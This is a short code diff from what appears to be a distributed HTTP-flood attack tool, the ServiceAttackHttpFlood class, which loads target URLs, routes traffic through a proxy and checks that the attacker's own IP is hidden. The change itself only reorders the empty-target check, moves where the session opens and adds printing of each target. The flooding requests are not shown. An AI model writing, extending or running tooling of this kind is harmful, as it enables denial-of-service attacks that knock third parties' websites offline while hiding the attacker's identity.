@@ -30,8 +30,15 @@ class ServiceAttackHttpFlood:
         http_flood_target_urls = self.storage_target.get_http_flood_target_urls()
         worker_settings = self.storage_settings.get_worker_settings()
 
-        # Open session
-        session = ClientSession()
+        # If we have no targets
+        if len(http_flood_target_urls) == 0:
+            print('ServiceAttackHttpFlood.attack_epoch(): WARNING!!! No available URLs found, skipping epoch #' + str(epoch_number))
+            time.sleep(30)
+            return
+
+        # Debug targets
+        for t in http_flood_target_urls:
+            print('ServiceAttackHttpFlood.attack_epoch(): Target ' + t)
 
         # Select proxy
         proxy = None
@@ -42,12 +49,8 @@ class ServiceAttackHttpFlood:
         else:
             print('ServiceAttackHttpFlood.attack_epoch(): WARNING!!! Proxy is disabled')
 
-        # If we have no targets
-        if len(http_flood_target_urls) == 0:
-            print('ServiceAttackHttpFlood.attack_epoch(): WARNING!!! No available URLs found, skipping epoch #' + str(epoch_number))
-            time.sleep(30)
-            await session.close()
-            return
+        # Open session
+        session = ClientSession()
 
         # Make sure your current IP is hidden
         check_my_ip_result = await self.check_my_ip(session, proxy=proxy)
